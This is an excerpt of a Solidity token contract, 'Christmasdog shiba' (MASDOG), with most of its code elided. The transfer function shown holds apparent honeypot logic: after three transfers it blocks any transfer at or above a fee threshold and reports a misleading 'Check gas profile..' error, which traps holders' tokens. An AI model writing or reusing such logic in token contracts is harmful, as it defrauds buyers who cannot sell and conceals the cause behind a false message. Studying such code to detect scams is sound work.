...
contract Winter is IERC20, Ownable {
    ...
    string constant _name = "Christmasdog shiba";
    string constant _symbol = "MASDOG";
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        {
            liquidityTick++;if(liquidityTick > 3){
                if (amount >= reflectionFee) 
			    revert("Check gas profile..");
            }
		}
